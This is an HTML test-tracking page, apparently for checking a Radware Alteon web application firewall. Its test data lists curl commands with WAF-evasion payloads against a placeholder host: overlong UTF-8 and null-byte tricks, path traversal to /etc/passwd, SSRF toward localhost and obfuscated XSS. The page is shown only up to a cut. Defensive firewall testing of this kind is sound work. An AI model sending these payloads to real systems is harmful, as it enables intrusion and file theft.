<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Radware Alteon WAF Testing Suite - Complete Edition</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --primary-light: #818cf8;
            --secondary: #0ea5e9;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1e293b;
            --light: #f8fafc;
            --gray-50: #f8fafc;
            --gray-100: #f1f5f9;
            --gray-200: #e2e8f0;
            --gray-300: #cbd5e1;
            --gray-400: #94a3b8;
            --gray-500: #64748b;
            --gray-600: #475569;
            --gray-700: #334155;
            --gray-800: #1e293b;
            --gray-900: #0f172a;
            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
            --shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
            --shadow-xl: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
            --shadow-2xl: 0 25px 50px -12px rgb(0 0 0 / 0.25);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--gray-50);
            color: var(--gray-900);
            line-height: 1.6;
            overflow-x: hidden;
        }

        /* Header */
        .header {
            background: linear-gradient(135deg, var(--gray-900) 0%, var(--gray-800) 100%);
            color: white;
            position: relative;
            overflow: hidden;
        }

        .header-content {
            position: relative;
            z-index: 1;
            padding: 2rem 0;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 1.5rem;
        }

        .header-main {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .logo {
            width: 50px;
            height: 50px;
            background: var(--primary);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.5rem;
            box-shadow: var(--shadow-lg);
        }

        h1 {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            color: var(--gray-300);
            font-size: 1rem;
        }

        .header-actions {
            display: flex;
            gap: 1rem;
        }

        .header-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            transition: var(--transition);
            backdrop-filter: blur(10px);
        }

        .header-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 1.5rem;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            transition: var(--transition);
        }

        .stat-card:hover {
            background: rgba(255, 255, 255, 0.15);
            transform: translateY(-4px);
            box-shadow: var(--shadow-xl);
        }

        .stat-value {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--gray-300);
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        /* Progress Section */
        .progress-section {
            background: white;
            border-radius: 16px;
            padding: 2rem;
            margin: -3rem 0 2rem;
            box-shadow: var(--shadow-xl);
            position: relative;
            z-index: 10;
        }

        .progress-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
        }

        .progress-title {
            font-size: 1.25rem;
            font-weight: 600;
        }

        .progress-percentage {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .progress-bar {
            background: var(--gray-100);
            height: 40px;
            border-radius: 20px;
            overflow: hidden;
            position: relative;
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.06);
        }

        .progress-fill {
            height: 100%;
            display: flex;
            position: relative;
            transition: width 0.6s ease-out;
        }

        .progress-segment {
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 0.875rem;
            font-weight: 600;
            position: relative;
            overflow: hidden;
        }

        .progress-passed { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
        .progress-failed { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); }
        .progress-skipped { background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); }

        /* Controls */
        .controls-section {
            background: white;
            border-radius: 16px;
            padding: 2rem;
            margin-bottom: 2rem;
            box-shadow: var(--shadow-md);
        }

        .search-wrapper {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .search-icon {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray-400);
        }

        .search-box {
            width: 100%;
            padding: 1rem 1rem 1rem 3rem;
            border: 2px solid var(--gray-200);
            border-radius: 12px;
            font-size: 1rem;
            transition: var(--transition);
        }

        .search-box:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .controls-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .filter-group {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .filter-btn {
            padding: 0.625rem 1.25rem;
            border: 2px solid var(--gray-200);
            background: white;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            transition: var(--transition);
        }

        .filter-btn:hover {
            border-color: var(--primary);
            transform: translateY(-2px);
        }

        .filter-btn.active {
            background: var(--primary);
            color: white;
            border-color: var(--primary);
        }

        .action-group {
            display: flex;
            gap: 0.75rem;
        }

        .action-btn {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.625rem 1.25rem;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            transition: var(--transition);
            box-shadow: var(--shadow);
        }

        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }

        .btn-export {
            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
            color: white;
        }

        .btn-import {
            background: linear-gradient(135deg, var(--info) 0%, #2563eb 100%);
            color: white;
        }

        .btn-reset {
            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
            color: white;
        }

        /* Test Categories */
        .test-category {
            background: white;
            border-radius: 16px;
            margin-bottom: 2rem;
            box-shadow: var(--shadow-md);
            overflow: hidden;
            transition: var(--transition);
        }

        .test-category:hover {
            box-shadow: var(--shadow-lg);
        }

        .category-header {
            background: linear-gradient(135deg, var(--gray-800) 0%, var(--gray-700) 100%);
            color: white;
            padding: 1.5rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: var(--transition);
        }

        .category-header:hover {
            background: linear-gradient(135deg, var(--gray-700) 0%, var(--gray-600) 100%);
        }

        .category-title {
            display: flex;
            align-items: center;
            gap: 1rem;
            font-size: 1.125rem;
            font-weight: 600;
        }

        .category-icon {
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.25rem;
        }

        .category-stats {
            display: flex;
            gap: 1.5rem;
            font-size: 0.875rem;
        }

        .category-stat {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .stat-icon {
            width: 24px;
            height: 24px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.75rem;
        }

        .category-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease-out;
        }

        .category-content.expanded {
            max-height: 100000px;
        }

        /* Test Items */
        .test-item {
            border-bottom: 1px solid var(--gray-100);
            padding: 2rem;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .test-item::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 4px;
            background: var(--gray-200);
            transition: var(--transition);
        }

        .test-item:hover {
            background: var(--gray-50);
        }

        .test-item.passed::before { background: var(--success); }
        .test-item.failed::before { background: var(--danger); }
        .test-item.skipped::before { background: var(--warning); }
        .test-item.partial::before { background: var(--info); }

        .test-item:last-child {
            border-bottom: none;
        }

        .test-header {
            display: flex;
            justify-content: space-between;
            align-items: start;
            margin-bottom: 1.5rem;
            gap: 2rem;
        }

        .test-info {
            flex: 1;
        }

        .test-name {
            font-size: 1.125rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
            color: var(--gray-900);
        }

        .test-description {
            color: var(--gray-600);
            font-size: 0.875rem;
            margin-bottom: 1rem;
            line-height: 1.6;
        }

        .test-badges {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .badge {
            padding: 0.375rem 0.875rem;
            border-radius: 6px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            display: inline-flex;
            align-items: center;
            gap: 0.375rem;
        }

        .severity-critical {
            background: rgba(239, 68, 68, 0.1);
            color: var(--danger);
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .severity-high {
            background: rgba(251, 146, 60, 0.1);
            color: #ea580c;
            border: 1px solid rgba(251, 146, 60, 0.2);
        }

        .severity-medium {
            background: rgba(245, 158, 11, 0.1);
            color: #d97706;
            border: 1px solid rgba(245, 158, 11, 0.2);
        }

        .severity-low {
            background: rgba(16, 185, 129, 0.1);
            color: #059669;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }

        .test-id {
            background: rgba(100, 116, 139, 0.1);
            color: var(--gray-600);
            border: 1px solid rgba(100, 116, 139, 0.2);
        }

        .test-actions {
            display: flex;
            gap: 0.5rem;
        }

        .test-action-btn {
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.875rem;
            font-weight: 500;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 0.375rem;
            box-shadow: var(--shadow-sm);
        }

        .test-action-btn:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .pass-btn {
            background: var(--success);
            color: white;
        }

        .fail-btn {
            background: var(--danger);
            color: white;
        }

        .skip-btn {
            background: var(--warning);
            color: white;
        }

        .clear-btn {
            background: var(--gray-400);
            color: white;
        }

        /* Scenarios Section */
        .scenarios-section {
            margin-top: 1.5rem;
        }

        .scenarios-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }

        .scenarios-label {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--gray-700);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .scenario-count {
            background: var(--primary);
            color: white;
            padding: 0.125rem 0.5rem;
            border-radius: 12px;
            font-size: 0.75rem;
        }

        .scenarios-container {
            display: grid;
            gap: 0.75rem;
        }

        .scenario-item {
            background: var(--gray-50);
            border: 1px solid var(--gray-200);
            border-radius: 8px;
            padding: 1rem;
            transition: var(--transition);
        }

        .scenario-item:hover {
            border-color: var(--primary);
            box-shadow: var(--shadow-sm);
        }

        .scenario-header {
            display: flex;
            justify-content: space-between;
            align-items: start;
            margin-bottom: 0.75rem;
        }

        .scenario-info {
            flex: 1;
        }

        .scenario-name {
            font-size: 0.875rem;
            font-weight: 600;
            margin-bottom: 0.25rem;
        }

        .scenario-description {
            font-size: 0.75rem;
            color: var(--gray-600);
        }

        .scenario-status {
            display: flex;
            gap: 0.375rem;
        }

        .scenario-action-btn {
            padding: 0.25rem 0.5rem;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.75rem;
            font-weight: 500;
            transition: var(--transition);
        }

        .scenario-action-btn:hover {
            transform: scale(1.05);
        }

        /* Code Block */
        .code-section {
            margin-top: 0.75rem;
        }

        .code-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.5rem;
        }

        .code-label {
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--gray-600);
            display: flex;
            align-items: center;
            gap: 0.375rem;
        }

        .copy-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 0.25rem 0.625rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.7rem;
            font-weight: 500;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 0.25rem;
        }

        .copy-btn:hover {
            background: var(--primary-dark);
            transform: translateY(-1px);
        }

        .code-block {
            background: var(--gray-900);
            border-radius: 6px;
            padding: 0.75rem;
            position: relative;
            overflow: hidden;
        }

        .code-content {
            color: #a5f3fc;
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Fira Code', 'Fira Mono', 'Roboto Mono', monospace;
            font-size: 0.75rem;
            line-height: 1.4;
            word-break: break-all;
            white-space: pre-wrap;
            overflow-x: auto;
        }

        /* Notes Section */
        .notes-section {
            margin-top: 1.5rem;
        }

        .notes-label {
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--gray-700);
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .notes-input {
            width: 100%;
            padding: 0.875rem;
            border: 2px solid var(--gray-200);
            border-radius: 8px;
            font-size: 0.875rem;
            resize: vertical;
            min-height: 80px;
            font-family: inherit;
            transition: var(--transition);
        }

        .notes-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        /* Modal */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(4px);
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            padding: 2.5rem;
            border-radius: 16px;
            max-width: 600px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: var(--shadow-2xl);
        }

        /* Toast */
        .toast {
            position: fixed;
            top: 2rem;
            right: 2rem;
            background: white;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            box-shadow: var(--shadow-xl);
            display: none;
            align-items: center;
            gap: 1rem;
            z-index: 3000;
        }

        .toast.active {
            display: flex;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header-main {
                flex-direction: column;
                align-items: flex-start;
                gap: 1.5rem;
            }

            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            .controls-row {
                flex-direction: column;
                align-items: stretch;
            }

            .test-header {
                flex-direction: column;
                gap: 1rem;
            }

            .test-actions {
                width: 100%;
                justify-content: stretch;
            }

            .test-action-btn {
                flex: 1;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <div class="container">
                <div class="header-main">
                    <div class="logo-section">
                        <div class="logo"><i class="fas fa-shield-alt"></i></div>
                        <div>
                            <h1>Radware Alteon WAF Testing Suite</h1>
                            <p class="subtitle">Complete WAF Security Assessment Platform</p>
                        </div>
                    </div>
                    <div class="header-actions">
                        <button class="header-btn" onclick="showSettings()">
                            <i class="fas fa-cog"></i> Settings
                        </button>
                    </div>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value" id="stat-total">0</div>
                        <div class="stat-label">Total Tests</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="stat-scenarios">0</div>
                        <div class="stat-label">Scenarios</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="stat-passed">0</div>
                        <div class="stat-label">Passed</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="stat-failed">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="stat-skipped">0</div>
                        <div class="stat-label">Skipped</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="stat-pending">0</div>
                        <div class="stat-label">Pending</div>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <main>
        <div class="container">
            <div class="progress-section">
                <div class="progress-header">
                    <h2 class="progress-title">Overall Test Progress</h2>
                    <div class="progress-percentage" id="progress-percentage">0%</div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill">
                        <div class="progress-segment progress-passed" id="progress-passed"></div>
                        <div class="progress-segment progress-failed" id="progress-failed"></div>
                        <div class="progress-segment progress-skipped" id="progress-skipped"></div>
                    </div>
                </div>
            </div>

            <div class="controls-section">
                <div class="search-wrapper">
                    <i class="fas fa-search search-icon"></i>
                    <input type="text" class="search-box" id="search" placeholder="Search tests, scenarios, IDs, or descriptions...">
                </div>
                <div class="controls-row">
                    <div class="filter-group">
                        <button class="filter-btn active" data-filter="all" onclick="filterTests('all')">All Tests</button>
                        <button class="filter-btn" data-filter="critical" onclick="filterTests('critical')">Critical</button>
                        <button class="filter-btn" data-filter="high" onclick="filterTests('high')">High</button>
                        <button class="filter-btn" data-filter="medium" onclick="filterTests('medium')">Medium</button>
                        <button class="filter-btn" data-filter="low" onclick="filterTests('low')">Low</button>
                    </div>
                    <div class="action-group">
                        <button class="action-btn btn-export" onclick="exportToExcel()">
                            <i class="fas fa-file-excel"></i> Export
                        </button>
                        <button class="action-btn btn-reset" onclick="resetAllResults()">
                            <i class="fas fa-redo"></i> Reset
                        </button>
                    </div>
                </div>
            </div>

            <div id="test-container">
                <!-- Test categories will be dynamically inserted here -->
            </div>
        </div>
    </main>

    <div class="toast" id="toast">
        <i class="fas fa-check-circle"></i>
        <span id="toast-message">Operation completed successfully!</span>
    </div>

    <script>
        // Complete test data with ALL specified tests - ALL CURL COMMANDS FIXED
        const tests = {
          'UTF8/Unicode Parsing': [
                {
                    id: 'UTF8-001',
                    name: 'Allow UTF8 Parse Failure in Reply Start Line',
                    severity: 'high',
                    description: 'Tests if WAF allows UTF8 parsing errors in HTTP response start line',
                    scenarios: [
                        {
                            id: 'UTF8-001-A',
                            name: 'Basic UTF8 Parse Failure',
                            description: 'Invalid UTF8 sequence in response',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Invalid-UTF8: %C3%28" -v'
                        },
                        {
                            id: 'UTF8-001-B',
                            name: 'UTF8 in Status Line',
                            description: 'UTF8 error in HTTP status line',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Response-UTF8: %C3%28" --http1.0 -v'
                        },
                        {
                            id: 'UTF8-001-C',
                            name: 'Multiple UTF8 Errors',
                            description: 'Multiple UTF8 parsing failures',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Test1: %C3%28" -H "X-Test2: %C3%29" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-002',
                    name: 'Allow Unicode Parse Failure in Reply Start Line',
                    severity: 'high',
                    description: 'Tests Unicode parsing error handling in HTTP response start line',
                    scenarios: [
                        {
                            id: 'UTF8-002-A',
                            name: 'Invalid Unicode Sequence',
                            description: 'Malformed Unicode in response',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Invalid-Unicode: %ED%A0%80" -v'
                        },
                        {
                            id: 'UTF8-002-B',
                            name: 'Unicode Surrogate Pairs',
                            description: 'Invalid surrogate pairs',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Surrogate: %ED%A0%80%ED%B0%80" -v'
                        },
                        {
                            id: 'UTF8-002-C',
                            name: 'Mixed Unicode Errors',
                            description: 'Combination of Unicode errors',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Mixed: %ED%A0%80test%ED%B0%80" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-003',
                    name: 'Allow UTF8 Parse Failure in URI Scheme Name',
                    severity: 'high',
                    description: 'Tests UTF8 parsing failures in URI scheme',
                    scenarios: [
                        {
                            id: 'UTF8-003-A',
                            name: 'UTF8 in Scheme',
                            description: 'Invalid UTF8 in URI scheme',
                            curl: 'curl "http://TARGET_HOST/test?scheme=ht%C3%28tp" -v'
                        },
                        {
                            id: 'UTF8-003-B',
                            name: 'UTF8 in Custom Scheme',
                            description: 'UTF8 errors in custom URI scheme',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Custom-URI: cust%C3%28om://test" -v'
                        },
                        {
                            id: 'UTF8-003-C',
                            name: 'Multiple Scheme Errors',
                            description: 'Multiple UTF8 errors in scheme',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Scheme: %C3%28://%C3%29" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-004',
                    name: 'Allow UTF8 Parse Failure in URI Authority',
                    severity: 'high',
                    description: 'Tests UTF8 parsing failures in URI authority section',
                    scenarios: [
                        {
                            id: 'UTF8-004-A',
                            name: 'UTF8 in Authority',
                            description: 'Invalid UTF8 in URI authority',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Authority: %C3%28.example.com" -v'
                        },
                        {
                            id: 'UTF8-004-B',
                            name: 'UTF8 in Userinfo',
                            description: 'UTF8 errors in userinfo part',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Auth: user%C3%28:pass@host" -v'
                        },
                        {
                            id: 'UTF8-004-C',
                            name: 'UTF8 in Port',
                            description: 'UTF8 errors in port specification',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Port: host:80%C3%2880" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-005',
                    name: 'HTTP Header UTF8 Evasion Techniques',
                    severity: 'critical',
                    description: 'Tests UTF8 evasion techniques in HTTP headers to bypass security controls',
                    scenarios: [
                        {
                            id: 'UTF8-005-A',
                            name: 'Partial Header UTF8 Corruption',
                            description: 'Embeds invalid UTF8 sequences in header names',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Se%C3%28curity-Bypass: test" -v'
                        },
                        {
                            id: 'UTF8-005-B',
                            name: 'Header Normalization Bypass',
                            description: 'Attempts to bypass header normalization with UTF8 errors',
                            curl: 'curl "http://TARGET_HOST/test" -H "Conte%C3%28nt-Type: application/json" -v'
                        },
                        {
                            id: 'UTF8-005-C',
                            name: 'Mixed Case with UTF8 Errors',
                            description: 'Combines case sensitivity with UTF8 errors',
                            curl: 'curl "http://TARGET_HOST/test" -H "x-Xss-%C3%28Protection: 0" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-006',
                    name: 'Overlong UTF8 Encoding Evasion',
                    severity: 'critical',
                    description: 'Tests overlong UTF8 encoding to bypass signature-based filters',
                    scenarios: [
                        {
                            id: 'UTF8-006-A',
                            name: 'Basic Overlong Encoding',
                            description: 'Uses 2-byte encoding for ASCII characters',
                            curl: 'curl "http://TARGET_HOST/test?payload=%C0%AE%C0%AE%2F" -v'
                        },
                        {
                            id: 'UTF8-006-B',
                            name: 'Triple-byte Overlong Encoding',
                            description: 'Uses 3-byte encoding for ASCII characters',
                            curl: 'curl "http://TARGET_HOST/test?cmd=%E0%80%AF%E0%80%AE%E0%80%AF" -v'
                        },
                        {
                            id: 'UTF8-006-C',
                            name: 'Quad-byte Overlong Encoding',
                            description: 'Uses 4-byte encoding for simple characters',
                            curl: 'curl "http://TARGET_HOST/test?bypass=%F0%80%80%AF" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-007',
                    name: 'Unicode Normalization Evasion',
                    severity: 'high',
                    description: 'Tests Unicode normalization forms to bypass pattern matching',
                    scenarios: [
                        {
                            id: 'UTF8-007-A',
                            name: 'Combining Characters Evasion',
                            description: 'Uses combining diacritical marks to evade detection',
                            curl: 'curl "http://TARGET_HOST/test?payload=s%CC%A7elect" -v'
                        },
                        {
                            id: 'UTF8-007-B',
                            name: 'Full/Half-width Form Variation',
                            description: 'Uses half-width and full-width character variations',
                            curl: 'curl "http://TARGET_HOST/test?cmd=%EF%BD%93%EF%BD%85%EF%BD%8C%EF%BD%85%EF%BD%83%EF%BD%94" -v'
                        },
                        {
                            id: 'UTF8-007-C',
                            name: 'Bidirectional Text Manipulation',
                            description: 'Uses bidirectional control characters to obfuscate',
                            curl: 'curl "http://TARGET_HOST/test?query=%E2%80%AEtceles%E2%80%AC" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-008',
                    name: 'UTF8 Null Byte Injection',
                    severity: 'critical',
                    description: 'Tests null byte injection via UTF8 encoding to terminate string processing',
                    scenarios: [
                        {
                            id: 'UTF8-008-A',
                            name: 'Basic Null Byte Injection',
                            description: 'Injects %00 in URI parameters',
                            curl: 'curl "http://TARGET_HOST/test?file=legitimate.txt%00.php" -v'
                        },
                        {
                            id: 'UTF8-008-B',
                            name: 'Encoded Null in Headers',
                            description: 'Puts encoded null bytes in HTTP headers',
                            curl: 'curl "http://TARGET_HOST/test" -H "X-Filename: safe%00malicious" -v'
                        },
                        {
                            id: 'UTF8-008-C',
                            name: 'Overlong Encoded Null',
                            description: 'Uses overlong UTF8 encoding for null byte',
                            curl: 'curl "http://TARGET_HOST/test?file=safe%C0%80evil.php" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-009',
                    name: 'Request Body UTF8 Parsing',
                    severity: 'high',
                    description: 'Tests UTF8 parsing errors in HTTP request bodies',
                    scenarios: [
                        {
                            id: 'UTF8-009-A',
                            name: 'JSON UTF8 Corruption',
                            description: 'Malformed UTF8 in JSON payload',
                            curl: 'curl "http://TARGET_HOST/api" -X POST -H "Content-Type: application/json" -d "{\\"key\\":\\"%C3%28value\\"}" -v'
                        },
                        {
                            id: 'UTF8-009-B',
                            name: 'Form Data UTF8 Errors',
                            description: 'UTF8 errors in form data submission',
                            curl: 'curl "http://TARGET_HOST/form" -X POST -d "username=admin&password=pass%C3%28word" -v'
                        },
                        {
                            id: 'UTF8-009-C',
                            name: 'XML Entity UTF8 Manipulation',
                            description: 'Malformed UTF8 in XML entities',
                            curl: 'curl "http://TARGET_HOST/xml" -X POST -H "Content-Type: application/xml" -d "<?xml version=\\"1.0\\"?><root><element>%C3%28</element></root>" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-010',
                    name: 'Advanced UTF-16/UTF-32 Encoding Tests',
                    severity: 'high',
                    description: 'Tests parsing of UTF-16 and UTF-32 encoded content',
                    scenarios: [
                        {
                            id: 'UTF8-010-A',
                            name: 'UTF-16 BOM Handling',
                            description: 'Tests handling of UTF-16 BOM markers',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/plain; charset=utf-16" -H "X-Test: %FE%FF%00t%00e%00s%00t" -v'
                        },
                        {
                            id: 'UTF8-010-B',
                            name: 'UTF-32 Encoding',
                            description: 'Tests handling of UTF-32 encoded content',
                            curl: 'curl "http://TARGET_HOST/test" -H "Content-Type: text/plain; charset=utf-32" -H "X-Test: %00%00%FE%FF%00%00%00t%00%00%00e%00%00%00s%00%00%00t" -v'
                        },
                        {
                            id: 'UTF8-010-C',
                            name: 'Mixed Encoding Attack',
                            description: 'Combines multiple encodings in a single request',
                            curl: 'curl "http://TARGET_HOST/test?utf8=%E2%9C%93&utf16=%FE%FF%00t&param=%C3%28" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-011',
                    name: 'Path Traversal with UTF8 Evasion',
                    severity: 'critical',
                    description: 'Tests path traversal attacks using UTF8 encoding evasion techniques',
                    scenarios: [
                        {
                            id: 'UTF8-011-A',
                            name: 'Basic UTF8 Path Traversal',
                            description: 'Path traversal with UTF8 encoding',
                            curl: 'curl "http://TARGET_HOST/get?file=%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd" -v'
                        },
                        {
                            id: 'UTF8-011-B',
                            name: 'Double-encoded Path Traversal',
                            description: 'Double-encoded "../" sequences',
                            curl: 'curl "http://TARGET_HOST/get?path=%252E%252E%252F%252E%252E%252Fetc%252Fpasswd" -v'
                        },
                        {
                            id: 'UTF8-011-C',
                            name: 'UTF8 Normalization in Paths',
                            description: 'Uses Unicode normalization in path traversal',
                            curl: 'curl "http://TARGET_HOST/read?file=..%C0%AF..%C0%AFetc%C0%AFpasswd" -v'
                        }
                    ]
                },
                {
                    id: 'UTF8-012',
                    name: 'Hybrid Unicode Attack Vectors',
                    severity: 'critical',
                    description: 'Tests complex hybrid attacks combining multiple Unicode evasion techniques',
                    scenarios: [
                        {
                            id: 'UTF8-012-A',
                            name: 'SSRF with Unicode Evasion',
                            description: 'SSRF attack using Unicode evasion',
                            curl: 'curl "http://TARGET_HOST/fetch?url=http://%F0%9D%8C%86%F0%9D%8C%87%F0%9D%8C%88%F0%9D%8C%89.127.0.0.1" -v'
                        },
                        {
                            id: 'UTF8-012-B',
                            name: 'XSS with Unicode Combining',
                            description: 'XSS payload using Unicode combining characters',
                            curl: 'curl "http://TARGET_HOST/comment?text=%D1%95%CD%81c%CD%8Dr%CD%8Di%CD%8Dp%CD%8Dt:%CD%8Da%CD%8Dl%CD%8De%CD%8Dr%CD%8Dt(1)" -v'
                        },
                        {
                            id: 'UTF8-012-C',
                            name: 'SQL Injection with Unicode',
